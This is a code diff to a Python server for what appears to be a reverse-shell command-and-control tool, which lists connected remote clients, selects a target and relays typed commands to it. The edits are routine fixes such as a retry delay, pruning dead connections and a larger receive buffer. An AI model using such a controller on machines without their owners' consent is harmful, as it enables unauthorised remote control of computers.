@@ -1,5 +1,6 @@
 import socket
 import threading
+import time
 from queue import Queue
 
 
@@ -32,7 +33,8 @@ def socket_bind():
         s.bind((host, port))
         s.listen(5)
     except socket.error as msg:
-        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
+        print("Socket binding error: " + str(msg))
+        time.sleep(3)
         socket_bind()
 
 
@@ -49,26 +51,30 @@ def accept_connections():
             all_connections.append(conn)
             all_addresses.append(address)
             print('\nConnection has been established: ' + address[0])
-        except socket.error as msg:
-            print("Reset connections error: " + str(msg))
+        except:
+            print('Error accepting connections')
 
 
 # List connections
-def display_connections():
-    if len(all_addresses) > 0:
-        print('----- Clients -----')
-        for address in all_addresses:
-            print(str(all_addresses.index(address) + 1) + '   ' + str(address[0]) + '   ' + str(address[1]))
-        print('')
-    else:
-        print('No clients connected')
+def list_connections():
+    results = ''
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)
+        except:
+            del all_connections[i]
+            del all_addresses[i]
+            continue
+        results += str(i) + '   ' + str(all_addresses[i][0]) + '   ' + str(all_addresses[i][1]) + '\n'
+    print('----- Clients -----' + '\n' + results)
 
 
 # Select a target
 def get_target(cmd):
     try:
         target = cmd.replace('select ', '')
-        target = int(target) - 1
+        target = int(target)
         conn = all_connections[target]
         print("You are now connected to " + str(all_addresses[target][0]))
         print(str(all_addresses[target][0]) + '> ', end="")
@@ -80,15 +86,16 @@ def get_target(cmd):
 
 # Connect with remote target client
 def send_target_commands(conn):
+    global s
     while True:
         try:
             cmd = input()
-            if cmd == 'quit':
-                break
             if len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
-                client_response = str(conn.recv(1024), "utf-8")
+                client_response = str(conn.recv(20480), "utf-8")
                 print(client_response, end="")
+            if cmd == 'quit':
+                break
         except:
             print("Connection was lost")
             break
@@ -96,10 +103,11 @@ def send_target_commands(conn):
 
 # Replaces send_commands(conn)
 def start_turtle():
+    global s
     while True:
         cmd = input('turtle> ')
         if cmd == 'list':
-            display_connections()
+            list_connections()
             continue
         elif 'select' in cmd:
             conn = get_target(cmd)
